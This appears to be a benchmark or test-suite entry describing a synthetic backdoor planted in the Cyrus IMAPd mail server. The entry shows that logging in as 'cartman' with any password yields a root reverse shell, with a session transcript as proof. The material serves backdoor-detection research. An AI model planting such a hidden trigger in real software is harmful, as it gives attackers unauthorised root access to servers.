# Cyrus-IMAPd 3.4.0

- **Type**: hidden feature (Reverse shell)
- **Affected versions**: none (synthetic backdoor)

## Backdoor

The command `LOGIN cartman` triggers a reverse-shell in the Cyrus IMAPd mail server.

### Triggering the backdoor

By logging in as `cartman` with any password:

```
* OK [CAPABILITY IMAP4rev1 IMAP4rev2 AUTH=SCRAM-SHA-1 AUTH=SCRAM-SHA-256 AUTH=DIGEST-MD5 AUTH=NTLM AUTH=CRAM-MD5 AUTH=LOGIN AUTH=PLAIN ENABLE ID LITERAL+ SASL-IR] d60b4749ef64 Cyrus IMAP unknown server ready
A LOGIN cartman toto
# whoami
root
```